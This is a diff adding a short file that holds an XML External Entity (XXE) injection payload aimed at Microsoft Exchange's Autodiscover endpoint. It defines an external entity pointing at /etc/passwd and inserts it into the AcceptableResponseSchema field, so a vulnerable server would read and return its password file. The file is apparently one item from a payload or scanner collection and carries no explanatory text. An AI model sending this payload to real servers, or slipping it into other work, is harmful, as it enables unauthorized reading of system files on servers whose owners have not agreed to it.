@@ -1,0 +1,9 @@
+<!DOCTYPE xxe [
+<!ELEMENT name ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
+<Request>
+<EMailAddress>aaaaa</EMailAddress>
+<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
+</Request>
+</Autodiscover>
